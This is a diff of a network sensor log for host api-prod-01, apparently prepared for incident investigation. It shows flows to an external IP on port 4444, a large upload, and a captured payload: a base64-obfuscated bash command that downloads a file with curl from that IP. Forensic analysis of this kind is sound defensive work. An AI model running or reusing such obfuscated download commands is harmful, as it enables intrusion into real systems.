@@ -1,13 +1,19 @@
-window_start: 2026-02-14T03:13:00Z
+window_start: 2026-02-14T02:48:00Z
 window_end: 2026-02-14T03:42:00Z
 sensor: edge-tap-02
 
 Top external peers from api-prod-01:
-- 185.199.110.153: bytes_out=1843921 bytes_in=12984 flows=4
+- 185.199.110.153: bytes_out=1843921 bytes_in=12984 flows=6
 - 91.92.109.126: bytes_out=0 bytes_in=0 flows=1
 - 198.51.100.44: inbound_http=3 requests
+- 203.0.113.9: inbound_http=2 requests
 
 Notable connections:
-- 10.10.10.23:54466 -> 185.199.110.153:4444 duration=571s service=unknown
+- 10.10.10.23:54466 -> 185.199.110.153:4444 duration=571s service=tls-like
 - 10.10.10.23:54901 -> 185.199.110.153:443 duration=18s service=tls
 - 10.10.10.23:54822 -> 10.10.10.12:5432 duration=94s service=postgres
+- 10.10.10.23:55011 -> 185.199.110.153:53 duration=3s service=dns
+
+Packet excerpt:
+- 03:17:22 payload observed in stream 12: bash -c $(echo Y3VybCBodHRwOi8vMTg1LjE5OS4xMTAuMTUzL3QuYmlu | base64 -d)
+- 03:35:10 HTTP over TLS metadata: POST /upload content-length=1843200
